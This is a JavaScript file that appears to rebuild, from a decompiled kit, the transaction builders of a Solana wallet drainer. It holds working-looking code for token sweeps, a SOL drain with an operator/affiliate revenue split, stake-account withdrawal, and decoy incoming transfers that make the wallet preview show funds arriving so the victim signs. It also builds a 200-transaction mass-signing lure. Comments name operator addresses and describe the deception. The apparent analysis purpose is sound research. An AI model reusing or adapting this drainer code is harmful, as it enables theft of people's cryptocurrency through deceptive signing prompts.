/**
 * rebuilt/chain/tx_builders.js
 *
 * Full drain transaction assembly.
 *
 * Sources:
 *   - decompiled/kit/chain/tx_builders.js
 *   - decompiled/kit/chain/pumpfun.js
 *   - decompiled/kit/chain/stake_drain.js
 *   - bundle.deobfuscated.js lines 20476–20619 (payload builders)
 *   - decompiled/live/dynamic/captured_tx_2026-11-12.json (wire evidence)
 *   - decompiled/kit/chain/operator_program.md (on-chain instruction shapes)
 *   - DRAIN_PIPELINE.md (full kill chain)
 */

'use strict';

const { base58Decode, writeU32, writeU64 } = require('../core/crypto');
const { COMPUTE }  = require('../core/state');
const iocs = require('../config/constants');

// ── Program addresses ─────────────────────────────────────────────────────
const SYSTEM_PROGRAM    = '11111111111111111111111111111111';
const COMPUTE_BUDGET_P  = 'ComputeBudget111111111111111111111111111111';
const OPERATOR_PROGRAM  = iocs.OPERATOR_PROGRAM;    // TwrGADB9...
const ATA_PROGRAM       = iocs.ATA_PROGRAM;
const TOKEN_PROGRAM     = iocs.TOKEN_PROGRAM;
const TOKEN_2022        = iocs.TOKEN_2022;
const TREASURY          = iocs.TREASURY;            // DvTqmF7u... (fee payer)
const STAKE_PROGRAM     = 'Stake11111111111111111111111111111111111111';
const SYSVAR_CLOCK      = 'SysvarC1ock11111111111111111111111111111111';
const SYSVAR_STAKE_HIST = 'SysvarStakeHistory1111111111111111111111111';

// ── Low-level instruction builders ───────────────────────────────────────

/**
 * computeUnitLimit(units):
 *   ComputeBudget.SetComputeUnitLimit
 *   data = [2, u32 LE units]  (5 bytes)
 */
function computeUnitLimit(units) {
  const data = new Uint8Array(5);
  data[0] = 2;
  writeU32(data, units >>> 0, 1);
  return { program: COMPUTE_BUDGET_P, data, accounts: [], computeUnits: 150 };
}

/**
 * computeUnitPrice(microlamports):
 *   ComputeBudget.SetComputeUnitPrice
 *   data = [3, u64 LE microlamports]  (9 bytes)
 */
function computeUnitPrice(microlamports) {
  const data = new Uint8Array(9);
  data[0] = 3;
  writeU64(data, BigInt(microlamports), 1);
  return { program: COMPUTE_BUDGET_P, data, accounts: [] };
}

/**
 * markerInstruction(campaignTag):
 *   Operator program, discriminator 0x00. No accounts.
 *   Payload = ASCII campaign tag, e.g. "1kd1mz4r-|1|"
 *   This IS the affiliate ledger — written to every drain tx forever.
 *   Visible on-chain in plaintext.
 *
 *   compute: ~144 CU
 */
function markerInstruction(campaignTag) {
  const data = new TextEncoder().encode(campaignTag);
  return {
    program:      OPERATOR_PROGRAM,
    data,
    accounts:     [],
    computeUnits: 144,
  };
}

/**
 * tokenDrainInstruction(tokenAccount, victimPubkey, drainThrough, mint, isToken2022):
 *   Operator program token sweep.
 *   Single-byte discriminator (0x02 or 0x03 depending on account role).
 *
 *   disc 0x02 → accounts: [{tokenAccount, r:2}, {victimPubkey, r:3}, ...]
 *   disc 0x03 → accounts: [{tokenAccount, r:3}, ...]
 *
 *   compute: base 5,000 + token2022 bonus (up to 20,300)
 *   The kit CPI-calls the operator program which moves the tokens.
 *
 *   isToken2022: true for Token-2022 / TransferCheckedWithFee
 *   mint: required for Token-2022
 */
function tokenDrainInstruction(tokenAccount, victimPubkey, drainThrough, mint, isToken2022) {
  // disc 0x02 is the standard token drain discriminator (observed in real txs)
  const data     = new Uint8Array([0x02]);
  const accounts = [
    { pubkey: tokenAccount, isSigner: false, isWritable: true },   // r:2
    { pubkey: victimPubkey, isSigner: true,  isWritable: true },   // r:3
    { pubkey: drainThrough, isSigner: false, isWritable: true },   // r:1
  ];
  if (mint && isToken2022) {
    accounts.push({ pubkey: mint, isSigner: false, isWritable: false }); // mint for Token-2022
    accounts.push({ pubkey: TOKEN_2022, isSigner: false, isWritable: false });
  } else {
    accounts.push({ pubkey: TOKEN_PROGRAM, isSigner: false, isWritable: false });
  }
  const extraCU = isToken2022 ? COMPUTE.TOKEN2022 : 0;
  return {
    program:      OPERATOR_PROGRAM,
    data,
    accounts,
    computeUnits: COMPUTE.PER_TOKEN + extraCU,
  };
}

/**
 * solDrainInstruction(victimPubkey, receiverPubkey, collectorPubkey, affiliatePct):
 *   Operator program SOL drain with revenue split.
 *   Discriminator 0x15 (21 decimal).
 *
 *   data = [0x15, 0x02, affiliatePct]  (3 bytes)
 *     affiliatePct: 0x50 = 80% to receiver, 0x4B = 75% to receiver
 *                   remainder goes to collector 6cwsqBqm (vendor cut)
 *
 *   accounts:
 *     [0] victimPubkey      signer + writable
 *     [1] receiverPubkey    writable  (per-campaign receiver from /api/config)
 *     [2] collectorPubkey   writable  (6cwsqBqm)
 *     [3] SystemProgram
 *
 *   compute: ~2,800 CU
 *
 *   This is the REAL theft instruction. The CPI is atomic with the
 *   decoy legs (which make the wallet preview show incoming funds).
 */
function solDrainInstruction(victimPubkey, receiverPubkey, collectorPubkey, affiliatePct) {
  const data = new Uint8Array([0x15, 0x02, affiliatePct]);
  const accounts = [
    { pubkey: victimPubkey,    isSigner: true,  isWritable: true },
    { pubkey: receiverPubkey,  isSigner: false, isWritable: true },
    { pubkey: collectorPubkey, isSigner: false, isWritable: true },
    { pubkey: SYSTEM_PROGRAM,  isSigner: false, isWritable: false },
  ];
  return {
    program:      OPERATOR_PROGRAM,
    data,
    accounts,
    computeUnits: 2800,
  };
}

/**
 * decoyIncomingSol(treasuryPubkey, victimPubkey, lamports):
 *   SystemProgram.Transfer — makes wallet preview show INCOMING SOL.
 *   treasury (DvTqmF7u) sends 1 SOL to the victim.
 *   This is what the wallet shows as "+1 SOL incoming" in the preview.
 *   treasury is the CO-SIGNER the operator provides server-side.
 *
 *   data = [2, u64 LE lamports]  (12 bytes, discriminator 2 = Transfer)
 */
function decoyIncomingSol(treasuryPubkey, victimPubkey, lamports) {
  const data = new Uint8Array(12);
  data[0] = 2; // SystemProgram.Transfer
  writeU64(data, BigInt(lamports), 4);
  return {
    program:  SYSTEM_PROGRAM,
    data,
    accounts: [
      { pubkey: treasuryPubkey, isSigner: true,  isWritable: true },  // r:3
      { pubkey: victimPubkey,   isSigner: false, isWritable: true },  // r:1
    ],
    computeUnits: 150,
  };
}

/**
 * decoyIncomingToken(relayPubkey, victimATA, relayAuthority, amount, mint):
 *   Token.Transfer — makes wallet preview show INCOMING USDC/token.
 *   relay (3emsAVdm) sends 500 USDC from its ATA to victim's ATA.
 *   This is what the wallet shows as "+500 USDC incoming".
 *   The authority signing for the relay is 7VHUFJHW (the first receiver address,
 *   which is a retired receiver still used as the decoy co-signer key).
 *
 *   This is WHY the kit needs 3 signers: victim + treasury + decoy-authority.
 */
function decoyIncomingToken(relaySourceATA, victimATA, authorityPubkey, amount, mint) {
  const data = new Uint8Array(12);
  data[0] = 3; // Token.Transfer
  writeU64(data, BigInt(amount), 4);
  return {
    program:  TOKEN_PROGRAM,
    data,
    accounts: [
      { pubkey: relaySourceATA,  isSigner: false, isWritable: true },   // source
      { pubkey: victimATA,       isSigner: false, isWritable: true },   // destination
      { pubkey: authorityPubkey, isSigner: true,  isWritable: false },  // authority
    ],
    computeUnits: 4000,
  };
}

/**
 * stakeWithdrawInstruction(stakeAccount, victimPubkey, destinationPubkey, lamports):
 *   Stake.Withdraw — drain a withdrawable native stake account.
 *   Only for state = "inactive" or "deactivating" stake accounts.
 *   Discriminator 4 (u32 LE).
 *   compute: ~2,800 CU
 */
function stakeWithdrawInstruction(stakeAccount, victimPubkey, destinationPubkey, lamports) {
  const data = new Uint8Array(12);
  writeU32(data, 4, 0);             // discriminator 4 for Stake.withdraw
  writeU64(data, BigInt(lamports), 4);
  return {
    program:  STAKE_PROGRAM,
    data,
    accounts: [
      { pubkey: stakeAccount,       isSigner: false, isWritable: true },
      { pubkey: destinationPubkey,  isSigner: false, isWritable: true },
      { pubkey: SYSVAR_CLOCK,       isSigner: false, isWritable: false },
      { pubkey: SYSVAR_STAKE_HIST,  isSigner: false, isWritable: false },
      { pubkey: victimPubkey,       isSigner: true,  isWritable: true },
    ],
    computeUnits: 2800,
  };
}

// ── Full drain transaction assembly ──────────────────────────────────────

/**
 * assembleMainDrainTx({
 *   victimPubkey,      base58 victim wallet
 *   tokens,            array of token objects from portfolio()
 *   solLamports,       victim's SOL balance in lamports
 *   config,            parsed /api/config object
 *   blockhash,         latest blockhash string
 *   campaignTag,       affiliate tag e.g. "1kd1mz4r-|1|"
 *   affiliatePct,      0x50 or 0x4B
 * })
 *
 * Returns the full instruction list for one drain transaction.
 * Victim signs this. Operator adds treasury + receiver signatures server-side.
 *
 * Full transaction shape (matches captured_tx_2026-11-12.json):
 *
 *   ix[0]  ComputeBudget.SetComputeUnitLimit(totalUnits)
 *   ix[1]  ComputeBudget.SetComputeUnitPrice(pricePerUnit)
 *   ix[2]  OPERATOR_PROGRAM disc 0x00  — marker (affiliate tag, ASCII)
 *   ix[3+] OPERATOR_PROGRAM disc 0x02  — token sweeps (one per token account)
 *   ix[N]  SystemProgram.Transfer      — DECOY: treasury→victim 1 SOL
 *   ix[N+1] ATA.CreateIdempotent       — SETUP: create victim's USDC ATA if needed
 *   ix[N+2] Token.Transfer             — DECOY: relay→victim 500 USDC
 *   ix[N+3] OPERATOR_PROGRAM disc 0x15 — THEFT: SOL drain with revenue split
 *
 * The wallet shows:
 *   "+1 SOL incoming, +500 USDC incoming" (from decoy legs ix[N] and ix[N+2])
 *   These are what the fake Confirm dialog highlights as "incoming funds".
 *   The actual drain is hidden in the operator program CPI (ix[3+] and ix[N+3]).
 */
function assembleMainDrainTx(opts) {
  const {
    victimPubkey, tokens = [], config,
    campaignTag, affiliatePct,
  } = opts;

  const instructions = [];

  // ── Compute budget calculation ──
  let totalCU = 500; // base overhead
  for (const token of tokens) {
    totalCU += COMPUTE.PER_TOKEN;
    if (token.token2022 && token.hasFee) totalCU += COMPUTE.TOKEN2022_FEE;
    else if (token.token2022)            totalCU += COMPUTE.TOKEN2022;
  }
  totalCU += 2800; // sol drain instruction
  totalCU += 300;  // marker + decoy overhead
  totalCU = Math.min(totalCU, COMPUTE.CAP);

  instructions.push(computeUnitLimit(totalCU));
  instructions.push(computeUnitPrice(1000)); // 1000 microlamports default

  // ── Marker instruction (affiliate ledger) ──
  instructions.push(markerInstruction(campaignTag));

  // ── Token sweep instructions ──
  for (const token of tokens.slice(0, COMPUTE.MAX_ACCOUNTS)) {
    instructions.push(tokenDrainInstruction(
      token.account,
      victimPubkey,
      iocs.DRAIN_THROUGH[0], // 4QFiKg8e... drain-through address
      token.mint,
      token.token2022,
    ));
  }

  // ── Decoy: 1 SOL incoming from treasury ──
  // treasury = DvTqmF7u — the operator's fee payer, signs server-side
  instructions.push(decoyIncomingSol(TREASURY, victimPubkey, 1_000_000_000));

  // ── Decoy: 500 USDC incoming from relay ──
  // This is the "+500 USDC" shown in the wallet preview
  // The relay ATA and the authority signing for it (7VHUFJHW, retired receiver)
  // are added by the server-side operator signatures
  instructions.push(decoyIncomingToken(
    null, // relay source ATA — determined server-side
    null, // victim's USDC ATA — determined server-side
    iocs.RECEIVER_A, // 7VHUFJHW... — the decoy authority key
    500_000_000,     // 500 USDC (6 decimals)
    iocs.USDC_MINT,
  ));

  // ── SOL drain with revenue split ──
  instructions.push(solDrainInstruction(
    victimPubkey,
    config.receiver, // per-campaign receiver from /api/config
    iocs.COLLECTOR,  // 6cwsqBqm (developer's 20-25% cut)
    affiliatePct,
  ));

  return instructions;
}

/**
 * assembleDummyTxs(count):
 *   For the "200tx" spam flow (FLOW.SPAM = 2).
 *   Builds up to 201 near-empty transactions:
 *     [computeUnitLimit(1000), computeUnitPrice(1000)] or
 *     [SystemProgram.Transfer(victimPubkey → treasury, 1 lamport)]
 *   The mass-sign prompt ("sign 200 transactions to verify...") is the lure.
 */
function assembleDummyTxs(victimPubkey, count = 200) {
  const txs = [];
  for (let i = 0; i < Math.min(count, 201); i++) {
    if (i % 2 === 0) {
      txs.push([computeUnitLimit(1000), computeUnitPrice(1000)]);
    } else {
      const data = new Uint8Array(12);
      data[0] = 2;
      writeU64(data, 1n, 4); // 1 lamport
      txs.push([{
        program:  SYSTEM_PROGRAM,
        data,
        accounts: [
          { pubkey: victimPubkey, isSigner: true,  isWritable: true },
          { pubkey: TREASURY,     isSigner: false, isWritable: true },
        ],
        computeUnits: 150,
      }]);
    }
  }
  return txs;
}

module.exports = {
  computeUnitLimit, computeUnitPrice,
  markerInstruction, tokenDrainInstruction,
  solDrainInstruction, decoyIncomingSol, decoyIncomingToken,
  stakeWithdrawInstruction,
  assembleMainDrainTx, assembleDummyTxs,
};
